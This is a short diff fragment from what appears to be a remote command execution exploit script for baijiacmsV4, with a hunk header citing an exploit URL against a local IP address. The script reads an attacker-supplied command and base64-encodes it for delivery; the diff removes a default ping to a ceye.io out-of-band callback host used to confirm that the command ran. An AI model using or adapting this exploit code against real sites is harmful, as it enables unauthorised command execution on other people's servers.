@@ -46,8 +46,7 @@ EXP2：http://192.168.0.64/baijiacmsV4-4.1.4/index.php?mod=site&act=public&do=fi
 import base64
 
 webpath = "/home/ubuntu/test/"
-print("exr6mq.ceye.io")
-cmd = input("cmd>>> ") or "ping php2.exr6mq.ceye.io"
+cmd = input("cmd>>> ") 
 
 
 b64cmd = base64.b64encode(cmd.encode()).decode()
